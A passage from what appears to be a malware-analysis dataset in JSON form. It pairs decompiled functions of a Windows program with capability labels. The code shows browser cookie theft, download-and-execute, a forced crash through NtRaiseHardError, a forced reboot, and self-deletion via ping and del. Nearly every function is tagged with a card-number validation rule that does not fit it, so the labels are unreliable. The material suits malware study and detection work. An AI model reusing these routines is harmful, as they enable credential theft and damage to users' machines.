00\";\n    }\n    else {\n        if (iVar6 != 1) {\n            if (iVar6 == 2) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x419540, \"RtlAdjustPrivilege\");\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x419540, \"NtRaiseHardError\");\n                pcVar5 = (*pcVar5)(uVar2);\n                (*pcVar4)(0x13, 1, 0, &var_11h);\n                (*pcVar5)(0xc00002b4, 0, 0, 0, 6, &var_28h);\n                return;\n            }\n            if (iVar6 == 3) goto code_r0x0040334e;\n            if (iVar6 != 4) {\n                if (iVar6 != 5) {\n                    return;\n                }\n                fcn.00413fc0();\n                fcn.00413915();\n                fcn.004043fa(L\"Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Network\\\\Cookies\");\n                puVar7 = &var_4h;\n                uVar2 = extraout_ECX;\n                fcn.00404656(puVar7);\n                fcn.00413c34(puVar7);\n                fcn.00413915(puVar7, uVar2);\n                fcn.004043fa(L\"\\\\Mozilla\\\\Firefox\\\\\");\n                fcn.00404656(&var_11h + 1);\n                fcn.004043fa(L\"profiles.ini\");\n                fcn.0040460a(L\"Profile\");\n                fcn.00404477(0);\n                fcn.00401293(&var_5f8h, 0, 0x208);\n                (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)(lpAppName, L\"Path\", 0, &var_5f8h, 0x104, var_8h);\n                fcn.00404656(&var_11h + 1);\n                fcn.004043fa(&var_5f8h);\n                fcn.00404422(\"\\\\cookies.sqlite\");\n                puVar7 = &var_ch;\n                uVar2 = extraout_ECX_00;\n                fcn.00404656(puVar7);\n                fcn.00413c34(puVar7);\n                fcn.00413915(puVar7, uVar2);\n                fcn.00404422(\"\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\cookies\");\n                puVar7 = &var_20h;\n                uVar2 = extraout_ECX_01;\n                fcn.00404656(puVar7);\n                fcn.00413c34(puVar7);\n                fcn.00413915(puVar7, uVar2);\n                fcn.00404422(\"\\\\Microsoft\\\\Windows\\\\INetCookies\");\n                puVar7 = &var_1ch;\n                uVar2 = extraout_ECX_02;\n                fcn.00404656(puVar7);\n                fcn.00413c34(puVar7);\n                fcn.00413915(puVar7, uVar2);\n                fcn.00404422(\"\\\\Microsoft\\\\Windows\\\\Cookies\");\n                puVar7 = &var_18h;\n                uVar2 = extraout_ECX_03;\n                fcn.00404656(puVar7);\n                fcn.00413c34(puVar7);\n                fcn.00406f1d(uVar2);\n                fcn.00406f1d();\n                fcn.00406f1d();\n                fcn.00406f1d();\n                var_ch = 0;\n                fcn.00406f1d();\n                fcn.00406f1d();\n                fcn.00406f1d();\n                fcn.00406f1d();\n                fcn.00413c16();\n                return;\n            }\n            while( true ) {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x0040334e:\n                fcn.00401293(&var_94h, 0, 0x44);\n                puVar7 = &var_94h;\n                puVar8 = &var_e0h;\n                for (iVar6 = 0x11; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar8 = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    puVar8 = puVar8 + 1;\n                }\n                var_48h = 0;\n                uStack72 = 0;\n                uStack68 = 0;\n                uStack64 = 0;\n                var_38h = 0;\n                var_34h = 0;\n                uStack52 = 0;\n                uStack48 = 0;\n                (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x104);\n                puVar7 = \"cmd.exe /C ping 1.2.3.4 -n 4 -w 1000 > Nul & cmd.exe /C \";\n                puVar8 = &lpCommandLine;\n                for (iVar6 = 0xe; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar8 = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    puVar8 = puVar8 + 1;\n                }\n                puVar7 = &lpFilename;\n                var_3b8h._0_1_ = 0x22;\n                do {\n                    cVar1 = *puVar7;\n                    puVar7 = puVar7 + 1;\n                } while (cVar1 != '\\0');\n                iVar6 = puVar7 - (&lpFilename + 1);\n                fcn.0040126d(&var_3b8h + 1, &lpFilename, iVar6);\n                *(&var_3b8h + iVar6 + 1) = 0x22;\n                fcn.00413915();\n                fcn.004043fa(L\"\\\\Documents:ApplicationData\");\n                fcn.00413960();\n                pcVar5 = _sym.imp.USER32.dll_CharLowerW;\n                uVar2 = (*_sym.imp.USER32.dll_CharLowerW)(var_4h);\n                uVar3 = (*pcVar5)(var_8h);\n                iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(uVar3, uVar2);\n                if (iVar6 == 0) break;\n                (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &lpCommandLine, 0, 0, 0, 0x8000000, 0, 0, &var_e0h, &var_38h)\n                ;\n                pcVar5 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_34h);\n                (*pcVar5)(var_38h);\n            }\n            fcn.00406f1d();\n            fcn.00406f1d();\n            return;\n        }\n        pcVar9 = \"shutdown.exe /r /f /t 00\";\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(pcVar9, 0);\n    return;\n}\n",
        "token_count": 1993
    },
    "004036ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "download URL",
            "receive data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004036ea(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint oflag;\n    \n    fcn.00413915();\n    fcn.004043fa(0x4194e4);\n    uVar1 = fcn.004044c4();\n    fcn.004042c5(uVar1);\n    fcn.00406f1d();\n    iVar3 = arg_8h + 4;\n    fcn.00404656(iVar3);\n    uVar1 = fcn.0040453a(&arg_8h);\n    fcn.004042c5(uVar1);\n    fcn.00406f1d();\n    arg_8h = 0;\n    fcn.00406f1d();\n    uVar1 = oflag;\n    fcn.00404656(iVar3);\n    iVar3 = (*_sym.imp.urlmon.dll_URLDownloadToFileW)(0, arg_8h, uVar1, 0, 0);\n    fcn.00406f1d();\n    if (iVar3 == 0) {\n        uVar2 = (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, L\"open\", oflag, 0, 0, 5);\n        var_ch = 2;\n        if (0x20 < uVar2) {\n            var_ch = 0;\n        }\n    }\n    else {\n        var_ch = 1;\n    }\n    var_10h = 0x41986c;\n    fcn.00405f32(&var_10h);\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 389
    },
    "00403978": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00403978(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint lpValueName;\n    uint *puVar4;\n    uint *puVar5;\n    uint lpCommandLine;\n    uint var_32dh;\n    ushort auStack464 [56];\n    uint lpFilename;\n    uint var_58h;\n    uint var_14h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    fcn.00414ce8();\n    iVar3 = fcn.00406a56();\n    if (iVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*0x551bfc, 0);\n    }\n    iVar3 = fcn.00406a8a();\n    if (iVar3 != 0) {\n        fcn.00414e25(*(param_2 + 8), param_2 + 0x14, 0x20006, 0);\n        lpValueName = fcn.00406a70(&var_4h);\n        fcn.00414d03(lpValueName);\n        fcn.004043b8();\n        fcn.00414d63();\n    }\n    fcn.00401293(&var_58h, 0, 0x44);\n    var_14h = 0;\n    var_10h = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x104);\n    puVar4 = \"cmd.exe /C ping 1.2.3.4 -n 2 -w 1000 > Nul & Del /f /q \";\n    puVar5 = &lpCommandLine;\n    for (iVar3 = 0xd; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = *puVar4;\n    *(puVar5 + 2) = *(puVar4 + 2);\n    puVar4 = &lpFilename;\n    var_32dh._0_1_ = 0x22;\n    do {\n        cVar1 = *puVar4;\n        puVar4 = puVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar3 = puVar4 - (&lpFilename + 1);\n    fcn.0040126d(&var_32dh + 1, &lpFilename, iVar3);\n    *(&var_32dh + iVar3 + 1) = 0x22;\n    (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &lpCommandLine, 0, 0, 0, 0x8000000, 0, 0, &var_58h, &var_14h);\n    pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(var_10h);\n    (*pcVar2)(var_14h);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 772
    },
    "00403d11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path",
            "create directory"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403d11(uint param_1, int32_t param_2)\n\n{\n    uint arg_30h;\n    uint arg_18h;\n    uint arg_14h;\n    uint uVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint noname_1;\n    uint arg_10h;\n    uint arg_1ch;\n    uint arg_20h;\n    uint arg_24h;\n    uint arg_28h;\n    uint arg_2ch;\n    uint lpPathName;\n    uint lpFilename;\n    uint var_50h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    var_ch = param_2;\n    fcn.004135d1();\n    fcn.004134a0();\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x104);\n    var_8h = 0;\n    fcn.00415e27();\n    var_10h = 0;\n    fcn.00415b64(0x10ad, &var_10h);\n    arg_30h = fcn.004136a5();\n    var_8h = fcn.004138ef();\n    arg_18h = fcn.00413893();\n    arg_14h = fcn.004136c8();\n    fcn.0040460a(var_14h);\n    fcn.0040460a(var_18h);\n    arg_24h = 0x419490;\n    arg_28h = extraout_ECX;\n    arg_2ch = var_10h;\n    fcn.0040460a(0x419490);\n    arg_20h = extraout_ECX_00;\n    fcn.004139ad();\n    arg_10h = 0x12f;\n    uVar1 = extraout_ECX_01;\n    noname_1 = extraout_ECX_01;\n    arg_1ch = var_8h;\n    fcn.004139e7();\n    uVar1 = fcn.004052bc(uVar1, noname_1, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch, \n                         arg_30h, var_18h);\n    fcn.00405f32(uVar1);\n    fcn.0040527a();\n    if (*(var_ch + 0x3c) != 0) {\n        fcn.00401293(&lpPathName, 0, 0x208);\n        (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &lpPathName);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpPathName, L\"\\\\Microsoft Vision\\\\\");\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(&lpPathName, 0);\n        fcn.0040bd63(var_1ch, 1);\n        var_ch = 0x41c9a4;\n        fcn.00405f32(&var_ch);\n    }\n    fcn.00406f1d();\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 767
    },
    "00403e83": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00403e83(uint *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    \n    arg_8h_00 = fcn.00406f77();\n    fcn.0040126d(arg_8h_00, *in_ECX + arg_ch, arg_10h);\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    fcn.00403fc7(arg_8h_00, arg_10h);\n    fcn.00406f66();\n    return arg_8h;\n}\n",
        "token_count": 154
    },
    "00403eca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403eca(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if (arg_8h[1] != 0) {\n        arg_8h_00 = fcn.00406f77();\n        *in_ECX = arg_8h_00;\n        fcn.0040126d(arg_8h_00, *arg_8h, arg_8h[1]);\n        in_ECX[1] = arg_8h[1];\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "00403f05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403f05(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint *in_ECX;\n    \n    arg_8h_00 = fcn.00401000(in_ECX[1] * 2 + 2);\n    fcn.00401293(arg_8h_00, 0, in_ECX[1] + 2);\n    fcn.0040126d(arg_8h_00, *in_ECX, in_ECX[1]);\n    fcn.0040460a(arg_8h_00);\n    if (arg_8h_00 != 0) {\n        fcn.00401014(arg_8h_00);\n    }\n    return arg_8h;\n}\n",
        "token_count": 170
    },
    "00403f58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403f58(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint *in_ECX;\n    \n    arg_8h_00 = fcn.00401000(in_ECX[1] + 1);\n    fcn.00401293(arg_8h_00, 0, in_ECX[1] + 1);\n    fcn.0040126d(arg_8h_00, *in_ECX, in_ECX[1]);\n    fcn.0040434f(arg_8h_00);\n    if (arg_8h_00 != 0) {\n        fcn.00401014(arg_8h_00);\n    }\n    return arg_8h;\n}\n",
        "token_count": 167
    },
    "00403fc7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403fc7(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    iVar1 = fcn.00406f3d();\n    *in_ECX = iVar1;\n    fcn.0040126d(in_ECX[1] + iVar1, arg_8h, arg_ch);\n    in_ECX[1] = in_ECX[1] + arg_ch;\n    return;\n}\n",
        "token_count": 111
    },
    "00404094": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404094(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint *in_ECX;\n    \n    arg_8h_00 = fcn.00406f77();\n    *in_ECX = arg_8h_00;\n    fcn.0040126d(arg_8h_00, *arg_8h, arg_8h[1]);\n    in_ECX[1] = arg_8h[1];\n    return;\n}\n",
        "token_count": 111
    },
    "004040d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004040d5(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_4h;\n    \n    *arg_8h = 0;\n    iVar1 = fcn.004040c4();\n    if (0 < iVar1) {\n        iVar1 = fcn.004040c4();\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 2, *in_ECX, iVar1 + 2, 0, 0);\n        lpString2 = fcn.00401000(iVar1 * 2);\n        fcn.004040c4();\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0xfde9, 0, *in_ECX, 0xffffffff, lpString2, iVar1 * 2);\n        arg_8h_00 = fcn.0040460a(lpString2);\n        fcn.004043c7(arg_8h_00);\n        fcn.00406f1d();\n        fcn.00401014(lpString2);\n    }\n    return arg_8h;\n}\n",
        "token_count": 276
    },
    "004041c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004041c2(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.004040c4();\n    fcn.004040c4();\n    uVar1 = fcn.00406ebe();\n    *in_ECX = uVar1;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(uVar1, *arg_8h);\n    return;\n}\n",
        "token_count": 102
    },
    "00404201": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query environment variable"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404201(uint param_1, uint *param_2)\n\n{\n    uint lpDst;\n    \n    fcn.00401293(&lpDst, 0, 0x400);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(*param_2, &lpDst, 0x1ff);\n    fcn.0040460a(&lpDst);\n    return param_1;\n}\n",
        "token_count": 95
    },
    "004042c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004042c5(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.004045f0();\n    fcn.004045f0();\n    uVar1 = fcn.00406ebe();\n    *in_ECX = uVar1;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(uVar1, *arg_8h);\n    return;\n}\n",
        "token_count": 102
    },
    "00404477": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404477(uint arg_8h)\n\n{\n    uint ARG_0;\n    \n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x419718, arg_8h);\n    fcn.0040460a(&ARG_0);\n    fcn.004042c5(&arg_8h);\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 93
    },
    "004044c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004044c4(uint *param_1, int32_t param_2)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint var_34h;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    *param_1 = 0;\n    var_8h = param_1;\n    var_4h = param_2;\n    arg_8h = fcn.00401000(param_2);\n    fcn.00401293(arg_8h, 0, param_2);\n    puVar2 = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJK...\";\n    puVar4 = &var_34h;\n    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar2;\n    uVar5 = 0;\n    uVar3 = var_4h - 1;\n    if (uVar3 != 0) {\n        do {\n            iVar1 = fcn.00401032();\n            *(uVar5 + arg_8h) = *(&var_34h + iVar1 % 0x28);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar3);\n    }\n    *(arg_8h + uVar3) = 0;\n    fcn.00404422(arg_8h);\n    fcn.00401014(arg_8h);\n    return var_8h;\n}\n",
        "token_count": 401
    },
    "0040460a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040460a(uint lpString2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    \n    (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    uVar1 = fcn.00406e8d();\n    *in_ECX = uVar1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    fcn.00401293(*in_ECX, 0, iVar2 * 2 + 2);\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(*in_ECX, lpString2);\n    return;\n}\n",
        "token_count": 148
    },
    "004047fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004047fc(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00415dc4(**arg_8h);\n    fcn.004043c7(arg_8h_00);\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 78
    },
    "00404838": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404838(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00415dc4(**arg_8h);\n    fcn.004043c7(arg_8h_00);\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 78
    },
    "004048a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004048a2(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = fcn.00415dc4(*(*arg_8h + 4));\n    fcn.004043c7(arg_8h_00);\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 109
    },
    "0040496c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040496c(uint *param_1)\n\n{\n    *param_1 = 0x41977c;\n    if (param_1[3] != 0) {\n        fcn.00406f66();\n    }\n    param_1[3] = 0;\n    return;\n}\n",
        "token_count": 71
    },
    "004049bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004049bf(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00415dc4(**arg_8h);\n    fcn.004043c7(arg_8h_00);\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 78
    },
    "00404ccf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404ccf(uint *param_1)\n\n{\n    *param_1 = 0x4197ec;\n    if (param_1[3] != 0) {\n        fcn.00406f66();\n    }\n    param_1[3] = 0;\n    return;\n}\n",
        "token_count": 71
    },
    "00404cfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404cfc(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.00415dc4(**arg_8h);\n    arg_8h_00 = fcn.0040456d(&var_4h);\n    fcn.0040415d(arg_8h_00);\n    fcn.00406f1d();\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 110
    },
    "00404f63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404f63(uint *param_1)\n\n{\n    *param_1 = 0x419844;\n    param_1[1] = 0x41984c;\n    if (param_1[2] != 0) {\n        fcn.00406f66();\n    }\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 85
    },
    "004054ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004054ac(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x419894;\n    iVar1 = param_1[1];\n    if (iVar1 != 0) {\n        fcn.00401d40(iVar1);\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 108
    },
    "00405580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405580(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x41989c;\n    iVar1 = param_1[1];\n    if (iVar1 != 0) {\n        fcn.00401d0e(iVar1);\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 110
    },
    "004055b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004055b5(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack68 [36];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack32 = 3;\n    arg_ch = 0;\n    uStack28 = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            puVar1 = fcn.004018fe(auStack68, arg_ch);\n            fcn.00404767(*puVar1);\n            fcn.004015fb();\n            iVar2 = fcn.004018fe(auStack68, arg_ch);\n            fcn.00404788(iVar2 + 4);\n            fcn.004015fb();\n            iVar2 = fcn.004018fe(auStack68, arg_ch);\n            fcn.00404788(iVar2 + 8);\n            fcn.004015fb();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.004046da(arg_8h);\n    fcn.004046c6();\n    return arg_8h;\n}\n",
        "token_count": 305
    },
    "0040566f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040566f(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x4198a4;\n    iVar1 = param_1[1];\n    if (iVar1 != 0) {\n        fcn.00401cdf(iVar1);\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 110
    },
    "0040579a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040579a(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = 0x4198ac;\n    iVar1 = param_1[1];\n    if (iVar1 != 0) {\n        fcn.00401cab(iVar1);\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 109
    },
    "00406e1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406e1e(code **param_1, code **param_2)\n\n{\n    for (; param_1 < param_2; param_1 = param_1 + 1) {\n        if (*param_1 != NULL) {\n            (**param_1)();\n        }\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00406e8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406e8d(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_1, 0x3000, 4);\n    if (iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    fcn.00401293(iVar1, 0, param_1);\n    return iVar1;\n}\n",
        "token_count": 107
    },
    "00406ebe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406ebe(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t arg_10h;\n    int32_t arg_8h;\n    uint var_4h;\n    \n    arg_8h = 0;\n    arg_10h = 0;\n    if (param_1 != 0) {\n        arg_10h = fcn.00406e6d();\n    }\n    if (param_2 == 0) {\n        if (param_1 == 0) {\n            return 0;\n        }\n    }\n    else {\n        arg_8h = fcn.00406f2c();\n        if (param_1 == 0) {\n            return arg_8h;\n        }\n        if ((arg_8h != 0) && (arg_10h != 0)) {\n            if (param_2 < arg_10h) {\n                arg_10h = param_2;\n            }\n            fcn.0040126d(arg_8h, param_1, arg_10h);\n        }\n    }\n    fcn.00406f1d();\n    return arg_8h;\n}\n",
        "token_count": 260
    },
    "0040702c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
